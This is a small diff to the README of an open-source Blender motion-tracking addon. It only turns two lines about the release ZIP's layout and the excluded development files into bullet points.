@@ -7,9 +7,9 @@ A free and open-source motion tracking addon for Blender, inspired by KeenTools 
 - https://github.com/VinexN/polychase/releases/download/v5.1.1/polychase_v5.1.1_fixed.zip
 - Important: This ZIP contains the ready-to-use addon. Unlike the source code, it is structured specifically for Blender.
 
-The __init__.py file is located in the root of this archive to ensure a correct installation.
+- The __init__.py file is located in the root of this archive to ensure a correct installation.
 
-Other files in the main repository (like Makefiles or project configs) are intended for development only and are not included in this build.
+- Other files in the main repository (like Makefiles or project configs) are intended for development only and are not included in this build.
 
 ## Overview
 
